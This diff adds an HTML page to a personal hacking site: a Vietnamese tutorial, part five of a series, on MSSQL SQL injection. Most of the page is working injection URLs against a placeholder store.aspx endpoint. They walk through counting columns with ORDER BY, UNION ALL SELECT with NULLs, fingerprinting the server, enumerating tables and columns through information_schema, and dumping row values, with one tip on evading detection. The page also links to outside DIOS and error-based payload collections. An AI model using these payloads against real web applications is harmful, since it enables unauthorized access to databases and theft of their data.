@@ -1,0 +1,242 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>SQLI (Part 5)</title>
+        <link rel="icon" type="image/png" href="https://asayami.github.io/favicon.png"/>
+        <link rel="stylesheet" href="sqli_source/sqli_css.css">
+        <script src="sqli_source/sqli_js.js"></script>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+        <meta name="description" content="Những bài viết, kinh nghiệm của mình về SQL Injection">
+		<meta name="keywords" content="Hacking, hack, SQLI, SQL Injection">
+		<meta name="author" content="Asayami Kurashin">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+    </head>
+    <body>
+        <!-- Navigation Bar -->
+        <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
+            <div class="container-fluid navmain" id="navbar" onscroll="NavScroll()">
+                <script>window.onscroll = NavScroll;</script>
+                <a class="navbar-branch" href="https://asayami.github.io/">
+                    <img src="https://asayami.github.io/transparent-favicon.png" style="width:50px;"></img>
+                </a>
+                <button class="navbar-toggler ml-auto custom-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive"  aria-controls="navbarSupportedContent-7" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ml-auto">
+                        <li class="nav-item active navitem">
+                            <a href="https://asayami.github.io/">Home
+                                <span class="sr-only">(current)</span>
+                            </a>
+                        </li>
+                        <div class="dropdown-divider"></div>
+                        <li class="nav-item navitem">
+                            <a href="https://asayami.github.io/hacking.html">Hacking</a>
+                        </li>
+                        <div class="dropdown-divider"></div>
+                        <li class="nav-item navitem">
+                            <a href="https://asayami.github.io#aboutanchor">About</a>
+                        </li>
+                        <div class="dropdown-divider"></div>
+                        <li class="nav-item navitem">
+                            <a href="https://asayami.github.io#contactanchor">Contact</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <div class="mainPicture"></div>
+		<div class="paratitle">
+			<h2>Introduction</h2>
+		</div>
+		<div class="paragraph">
+			<p>Trong các bài trước chúng ta đã tìm hiểu MySQL Injection, và trong series này chúng ta sẽ tìm hiểu về
+			MSSQL Injection. Nhìn chung cú pháp giữa 2 kiểu nói trên không khác nhau là mấy, và lối tư duy vẫn không
+			đổi so với MySQL Injection. Mở đầu chúng ta sẽ đến với Union MSSQL Injection.</p>
+		</div>
+		
+		<div class="paratitle">
+			<h2>MSSQL Union SQL Injection</h2>
+		</div>
+		<div class="paragraph">
+			<p>Giả sử website nhắm đến là:
+			<font color="#009933">worldend.com/store.aspx?id=1</font color="#009933">.
+			Lưu ý rằng không nhất thiết phải inject qua URL như thế này mà hoàn toàn có thể qua các thanh tìm kiếm,
+			input,... 
+			Ban đầu chúng ta vẫn sẽ phải tìm cách exploit như MySQL Injection (',",...). Giả sử website khi bị
+			khai thác là:
+			<font color="#009933">worldend.com/store.aspx?id=1')</font color="#009933">
+			Các kiểu comment phổ biến: --, --+, --+-, /**/, ;%00.
+			</p>
+			<p>Kế đến chúng ta vẫn sẽ sử dụng ORDER BY để tìm số lượng cột đang được gọi lên</p>
+			<p><font color="#009933">worldend.com/store.aspx?id=1') order by 10--+</font color="#009933">
+			</p><p>Giả sử có 4 cột đang được gọi lên</p>
+			<p><font color="#009933">
+			worldend.com/store.aspx?id=1') and 0=1 union select 1,2,3,4--+
+			</font color="#009933"></p>
+			<p>Nếu truy vấn trên trả về lỗi "Operand Type Clash: text is incompatible with int", chúng ta có thể
+			thay thế giá trị NULL vào các giá trị này</p>
+			<p><font color="#009933">
+			worldend.com/store.aspx?id=1') and 0=1 union select null,null,null,null--+
+			</font color="#009933"></p>
+			<p>Nếu sau khi thay giá trị null như trên website xuất hiện lỗi "The text data type cannot be selected
+			as DISTINCT because it is not comparable" thì thay vì dùng UNION SELECT chúng ta dùng UNION ALL SELECT.
+			Giải thích qua một chút về MSSQL, SELECT ALL hoặc SELECT có nghĩa chọn tất cả hàng (bao gồm hàng trùng nhau), ngược
+			lại với nó là SELECT DISTINCT (loại hàng trùng nhau) trong khi SELECT * có nghĩa tất cả các cột. Còn
+			UNION thông thường là UNION DISTINCT và phải dùng UNION ALL để giữ cả hàng trùng (trong lỗi trên vì các hàng
+			không thể so sánh với nhau nên phải dùng UNION ALL để bỏ qua bước kiểm tra hàng trùng).</p>
+			<p><font color="#009933">
+			worldend.com/store.aspx?id=1') and 0=1 union all select null,null,null,null--+
+			</font color="#009933"></p>
+			<p>Tuy nhiên sau đó chúng ta có thể gặp lỗi "Conversion from type 'DBNull' to type 'String' is not valid".
+			Lỗi này xảy ra khi một biến kiểu chuỗi đang bị gán giá trị NULL. Do đó chúng ta phải tìm xem cột nào
+			đang bị dính lỗi này và thay giá trị truyền vào tại cột đó thành một chuỗi. Để kiểm tra chúng ta thử
+			từng cột như bên dưới (lưu ý chuỗi dùng để test có thể để trong ngoặc kép, tuy nhiên dùng db_name() sẽ
+			tránh được một số lỗi vặt)</p>
+			<p><font color="#009933">
+			worldend.com/store.aspx?id=1') and 0=1 union all select db_name(),null,null,null--+
+			<br>...
+			<br>worldend.com/store.aspx?id=1') and 0=1 union all select null,null,null,db_name()--+
+			</font color="#009933"></p>
+			<p>Trong trường hợp số cột ít chúng ta có thể thử chay nhưng số lượng cột lên tới hàng chục thì phải
+			sử dụng tool hỗ trợ như Burp Suite</p>
+			<p>Kế đến chúng ta có thể bắt đầu lấy các thông tin sẵn có như db_name(), @@version,
+			@@SERVERNAME,... </p>
+			<p><img src="sqli_source/mssql_func.png" style="width:60%" class="img-fluid mx-auto d-block responsive_phone"></img></p>
+			<p>Quay lại trường hợp đơn giản nhất không gặp lỗi gì, chúng ta bắt đầu lấy tên các bảng. Có hai cách để
+			lấy tên bảng:</p>
+			<h3>Cách 1</h3>
+			<p><font color="#009933">
+			worldend.com/store.aspx?id=1') and 0=1 union all select 1,table_name,3,4 from information_schema.tables order by 1 offset 0 row--+
+			</font color="#009933"></p>
+			<p>Query trên sẽ trả về 1 giá trị là tên bảng đầu tiên trong danh sách toàn bộ tên bảng xếp theo cột thứ nhất. Để lấy
+			tên bảng tiếp theo, chúng ta chỉ cần thay đổi giá trị sau offset. Giả sử chúng ta lấy tên bảng thứ 3 thì
+			giá trị sau offset sẽ là 2 rows (sắp xếp theo cột 1 và bỏ 2 hàng đầu tiên, lấy kết quả từ hàng 3 trở đi)</p>
+			<p>Kế đến là lấy tên cột, cách thức và cú pháp tương tự trên. Giả sử tên bảng là tablesuka</p>
+			<p><font color="#009933">
+			worldend.com/store.aspx?id=1') and 0=1 union all select 1,column_name,3,4 from information_schema.columns where table_name='tablesuka' order by 1 offset 0 row--+
+			</font color="#009933"></p>
+			<h3>Cách 2</h3>
+			<p><font color="#009933">
+			worldend.com/store.aspx?id=1') and 0=1 union all select 1,table_name,3,4 from (select top 1 table_name from information_schema.tables order by 1) as meow order by 1 desc--+
+			</font color="#009933"></p>
+			<p>Query trên sẽ trả về 1 giá trị là tên bảng đầu tiên trong danh sách toàn bộ tên bảng xếp tăng dần. Để lấy
+			tên bảng tiếp theo, chúng ta chỉ cần thay đổi giá trị sau select top. Giả sử chúng ta lấy tên bảng thứ 2 thì
+			câu lệnh trên sẽ thực hiện các bước như sau:</p>
+			<div class="row">
+				<div class="col-md-4">
+					<table class="table table-bordered">
+						<thead class="thead-light">
+						<tr>
+						  <th scope="col">table_name</th>
+						</tr>
+						</thead>
+						<tbody>
+							<tr>
+								<td>2</td>
+							</tr>
+							<tr>
+								<td>4</td>
+							</tr>
+							<tr>
+								<td>3</td>
+							</tr>
+							<tr>
+								<td>1</td>
+							</tr>
+						</tbody>
+					</table>
+					<p style='text-align:center'>Danh sách bảng ban đầu</p>
+				</div>
+				
+				<div class="col-md-4">
+					<table class="table table-bordered">
+						<thead class="thead-light">
+						<tr>
+						  <th scope="col">table_name</th>
+						</tr>
+						</thead>
+						<tbody>
+							<tr>
+								<td>1</td>
+							</tr>
+							<tr>
+								<td>2</td>
+							</tr>
+							<tr>
+								<td>3</td>
+							</tr>
+							<tr>
+								<td>4</td>
+							</tr>
+						</tbody>
+					</table>
+					<p style='text-align:center'>DS bảng sau sắp xếp lần 1</p>
+				</div>
+				
+				<div class="col-md-4">
+					<table class="table table-bordered">
+						<thead class="thead-light">
+						<tr>
+						  <th scope="col">table_name</th>
+						</tr>
+						</thead>
+						<tbody>
+							<tr>
+								<td>2</td>
+							</tr>
+							<tr>
+								<td>1</td>
+							</tr>
+						</tbody>
+					</table>
+					<p style='text-align:center'>DS bảng sau sắp xếp lần 2</p>
+				</div>
+			</div>
+			<p>Và cuối cùng dữ liệu hiển thị là dòng đầu tiên đó chính là 2, hay tên bảng đứng thứ 2</p>
+			<p>Kế đến là lấy tên cột, cách thức và cú pháp tương tự trên. Giả sử tên bảng là tablesuka</p>
+			<p><font color="#009933">
+			worldend.com/store.aspx?id=1') and 0=1 union all select 1,column_name,3,4 from (select top 1 column_name from information_schema.columns where table_name='tablesuka' order by 1) as meow order by 1 desc--+
+			</font color="#009933"></p>
+			<p><br><br>Giả sử bảng có 2 cột là name và age. Để lấy giá trị các hàng cùng lúc chúng ta cũng có một vài cách:</p>
+			<p><font color="#009933">
+			worldend.com/store.aspx?id=1') and 0=1 union all select 1,concat(name,' ',age),3,4 from tablesuka
+			</font color="#009933"></p>
+			<p>Cách trên sử dụng function concat và có ưu điểm là gần như không phải quan tâm kiểu dữ liệu biến</p>
+			<p><font color="#009933">
+			worldend.com/store.aspx?id=1') and 0=1 union all select 1,name%2b' '%2bstr(age),3,4 from tablesuka
+			</font color="#009933"></p>
+			<p>Còn cách thứ 2 này sử dụng dấu + (%2b) để nối chuỗi và phải để ý kiểu dữ liệu, tuy nhiên sẽ khó bị
+			phát hiện hơn cách 1 chút ít</p>
+		</div>
+		
+		
+		<div class="paratitle">
+			<h2>MSSQL DIOS</h2>
+		</div>
+		<div class="paragraph">
+			<p>Tương tự như MySQL SQL Injection, đối với MSSQL cũng có DIOS. Để tham khảo các truy vấn cụ thể và giải
+			thích, bạn đọc xem tại
+			<a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/mssql-dios.html">Here</a></p>
+			<p>Đối với các truy vấn này, tuỳ từng trường hợp chúng ta phải sửa đổi chúng để đạt được output mong
+			muốn</p>
+		</div>
+		
+		<div class="paratitle">
+			<h2>MSSQL Error Based Injection</h2>
+		</div>
+		<div class="paragraph">
+			<p>Đối với MSSQL, có nhiều cách để gây lỗi khiến website hiển thị kết quả mong muốn đi kèm như
+			so sánh sai kiểu dữ liệu,... Để tham khảo các truy vấn cụ thể và giải thích, bạn đọc xem tại
+			<a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Error-Based-Injection.html">Here</a></p>
+			<p>Đối với các truy vấn này, tuỳ từng trường hợp chúng ta phải sửa đổi chúng để đạt được output mong
+			muốn</p>
+		</div>
+    </body>
+    
+</html>
